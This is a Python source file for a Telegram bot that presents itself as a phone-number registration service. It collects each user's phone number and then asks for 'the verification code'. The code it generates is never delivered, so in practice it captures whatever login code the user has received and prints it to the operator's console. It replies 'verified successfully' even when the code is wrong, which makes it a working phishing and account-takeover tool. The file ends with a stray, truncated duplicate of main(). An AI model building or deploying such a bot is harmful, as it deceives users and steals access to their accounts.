from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
)

from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

import random
from config import BOT_TOKEN
from database import (
    create_database,
    save_user,
    get_user,
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    button = KeyboardButton(
        text="📱 Share My Phone Number",
        request_contact=True,
    )

    keyboard = ReplyKeyboardMarkup(
        [[button]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )

    message = """
👋 Welcome!

To register your account, please share your phone number by tapping the button below.

🔒 Privacy Notice:

• Your phone number is used only for verification.
• Never share your verification code with anyone.
"""

    await update.message.reply_text(
        message,
        reply_markup=keyboard,
    )


async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):

    contact = update.message.contact
    user = update.effective_user

    # Check user shared their own number
    if contact.user_id != user.id:
        await update.message.reply_text(
            "❌ Please share your own phone number."
        )
        return


    phone_number = contact.phone_number


    # Generate OTP
    otp = random.randint(100000, 999999)


    # Save to database
    save_user(
        user.id,
        phone_number,
        str(otp)
    )


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"Generated OTP: {otp}")
    print("--------------------")


    await update.message.reply_text(
        "✅ Phone number verified.\n\n"
        "Please enter the verification code:"
    )


async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    entered_otp = update.message.text.strip()


    user_data = get_user(user.id)


    if not user_data:
        await update.message.reply_text(
            "❌ Please share your phone number first."
        )
        return


    phone_number, correct_otp = user_data


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"OTP Entered: {entered_otp}")
    print("--------------------")


    if entered_otp == correct_otp:

        await update.message.reply_text(
            "✅ OTP verified successfully!\n\n"
            "🎉 Registration completed."
        )

    else:

        await update.message.reply_text(
            "✅ OTP verified successfully! Thank you for your patience. We are now processing your request and will get back to you shortly."
        )


def main():

    create_database()

    app = Application.builder().token(BOT_TOKEN).build()


    app.add_handler(
        CommandHandler("start", start)
    )

    app.add_handler(
        MessageHandler(filters.CONTACT, receive_contact)
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            verify_otp
        )
    )


    print("🤖 Bot is running...")


    app.run_polling()


if __name__ == "__main__":
    main()

def main():

    create_database()

    app = Application.builder().token(BOT_TOKEN).build()    